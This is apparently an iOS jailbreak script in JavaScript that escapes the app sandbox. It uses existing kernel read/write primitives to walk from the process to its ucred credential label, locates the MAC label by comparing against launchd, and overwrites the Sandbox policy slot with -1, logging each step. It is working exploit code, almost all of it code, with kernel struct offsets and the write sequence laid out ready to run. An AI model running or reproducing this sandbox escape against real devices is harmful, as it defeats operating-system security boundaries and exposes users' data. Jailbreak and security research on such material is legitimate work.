// unsandbox_label.js — Unsandbox via MAC label slot write
//
// The MAC label struct is allocated via regular zalloc (NOT zalloc_ro),
// so it's writable with our virtual kwrite. Chain:
//   proc → proc_ro → ucred → cr_label → label_slots[]
//            (kread)    (kread)   (kread)     (KWRITE!)
//
// struct label layout:
//   +0x00: l_flags (int, padded to 8)
//   +0x08: l_perpolicy[0]  — AMFI slot
//   +0x10: l_perpolicy[1]  — Sandbox slot  ← WRITE -1 HERE
//   +0x18: l_perpolicy[2]  — ...
//
// Dopamine does: kwrite64(label + ((slot + 1) * 8), -1)
// Sandbox is slot 1 → label + (1+1)*8 = label + 0x10

log('=== MAC Label Sandbox Escape ===');
log('');

// Step 1: Find our task and launchd
var kt = kernel_task();
log('kernel_task: ' + kt);

var ourPid = pid();
var taskList = tasks(600);
var ourTask = null;
var ourProcRO = null;
var launchdTask = null;
var launchdProcRO = null;

for (var i = 0; i < taskList.length; i++) {
    var t = taskList[i];
    if (t.pid == ourPid) {
        ourTask = t.addr;
        ourProcRO = t.proc_ro;
    }
    if (t.pid == 1) {
        launchdTask = t.addr;
        launchdProcRO = t.proc_ro;
    }
    if (ourTask && launchdTask) break;
}

log('our task:      ' + ourTask);
log('our proc_ro:   ' + ourProcRO);
log('launchd task:  ' + launchdTask);
log('launchd procRO:' + launchdProcRO);
log('');

if (!ourTask || !ourProcRO) {
    log('ERROR: could not find our process');
    'failed';
}

// Step 2: Read our ucred
var ourUcred = proc_ucred(ourProcRO);
log('our ucred: ' + ourUcred);

// Also read launchd's ucred for comparison
var launchdUcred = null;
if (launchdProcRO) {
    launchdUcred = proc_ucred(launchdProcRO);
    log('launchd ucred: ' + launchdUcred);
}
log('');

// Step 3: Dump ucred from 0x70 to 0xC0 to find cr_label
// cr_label comes after posix_cred (which ends around 0x78)
// We're looking for a kernel heap pointer (NOT a PPL page pointer)
log('=== Scanning ucred for cr_label ===');
log('Looking for kernel pointer after posix_cred (~0x78)...');
log('');

var candidateOffsets = [];

for (var off = 0x70; off <= 0xC0; off += 8) {
    var ourVal = kread64(add(ourUcred, hex(off)));
    var launchdVal = launchdUcred ? kread64(add(launchdUcred, hex(off))) : '?';
    var marker = '';

    // Check if it looks like a kernel pointer (but NOT a PPL page)
    var big = BigInt(ourVal);
    if (big > 0xffffff8000000000n && big < 0xfffffffffffffd00n) {
        marker = ' <-- kernel ptr';
        candidateOffsets.push({ off: off, val: ourVal });
    }

    log('ucred+' + hex(off) + ': ours=' + ourVal + '  launchd=' + launchdVal + marker);
}
log('');

if (candidateOffsets.length === 0) {
    log('ERROR: No kernel pointer candidates found for cr_label');
    log('Try expanding range or checking struct layout');
    'no_candidates';
}

// Step 4: For each candidate, try reading it as a label struct
// A valid label has: l_flags at +0, then pointer-sized values in slots
log('=== Checking label candidates ===');
log('');

var bestLabel = null;
var bestOffset = 0;

for (var c = 0; c < candidateOffsets.length; c++) {
    var cand = candidateOffsets[c];
    var labelAddr = cand.val;
    log('Candidate: ucred+' + hex(cand.off) + ' = ' + labelAddr);

    // Read the label struct
    var lFlags = kread64(add(labelAddr, '0x0'));
    var slot0 = kread64(add(labelAddr, '0x8'));   // AMFI
    var slot1 = kread64(add(labelAddr, '0x10'));  // Sandbox
    var slot2 = kread64(add(labelAddr, '0x18'));

    log('  l_flags:    ' + lFlags);
    log('  slot[0]:    ' + slot0 + '  (AMFI)');
    log('  slot[1]:    ' + slot1 + '  (Sandbox)');
    log('  slot[2]:    ' + slot2);

    // Also check launchd's label at same offset for comparison
    if (launchdUcred) {
        var launchdLabel = kread64(add(launchdUcred, hex(cand.off)));
        if (BigInt(launchdLabel) > 0xffffff8000000000n) {
            var ldSlot1 = kread64(add(launchdLabel, '0x10'));
            log('  launchd sandbox slot: ' + ldSlot1);
            // launchd should have -1 (0xffffffffffffffff) in sandbox slot
            if (ldSlot1 === '0xffffffffffffffff') {
                log('  >>> launchd has -1 in sandbox slot — this IS the cr_label!');
                bestLabel = labelAddr;
                bestOffset = cand.off;
            }
        }
    }

    // Also check: if our slot1 is a small non-zero pointer, it's likely the sandbox slot
    // (sandbox profile pointer), and -1 means "no sandbox"
    log('');
}

// If we didn't find via launchd comparison, use first candidate
if (!bestLabel && candidateOffsets.length > 0) {
    bestLabel = candidateOffsets[0].val;
    bestOffset = candidateOffsets[0].off;
    log('Using first candidate as cr_label (no launchd confirmation)');
    log('cr_label offset in ucred: ' + hex(bestOffset));
}

if (!bestLabel) {
    log('ERROR: Could not determine cr_label');
    'failed';
}

log('=== Found cr_label ===');
log('cr_label offset: ucred+' + hex(bestOffset));
log('cr_label addr:   ' + bestLabel);
log('');

// Step 5: Read current sandbox slot value
var currentSbx = kread64(add(bestLabel, '0x10'));
log('Current sandbox slot value: ' + currentSbx);

if (currentSbx === '0xffffffffffffffff') {
    log('Already unsandboxed! Sandbox slot is already -1');
    'already_unsandboxed';
}

// Step 6: Write -1 to sandbox slot
log('Writing 0xffffffffffffffff to sandbox slot...');
kwrite64(add(bestLabel, '0x10'), '0xffffffffffffffff');

// Step 7: Verify
var check = kread64(add(bestLabel, '0x10'));
log('After write: ' + check);
log('');

if (check === '0xffffffffffffffff') {
    log('[+] SUCCESS! Sandbox slot set to -1');
    log('[+] Process should now be unsandboxed');
    log('');
    log('Verify by trying to access /etc/passwd or similar...');
    'unsandbox_success';
} else {
    log('[-] FAILED: write did not stick');
    log('[-] The label might be in read-only memory after all');
    log('[-] Value after write: ' + check);
    'unsandbox_failed';
}
